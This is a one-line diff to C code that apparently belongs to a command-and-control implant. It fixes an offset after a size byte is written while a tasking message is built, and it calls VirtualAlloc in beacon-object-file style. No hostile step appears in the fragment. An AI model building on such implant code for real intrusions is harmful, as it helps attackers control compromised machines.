@@ -213,6 +213,7 @@ char *generate_tasking_message(TaskingRequest *tasking) {
 	
 	// 1 byte for the tasking size.
 	msg[offset] = tasking->tasking_size;
+	offset += 1;
 	
 	// Base64-encode the serialized message.
 	char *encoded_msg = KERNEL32$VirtualAlloc(0, len * 1.5, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
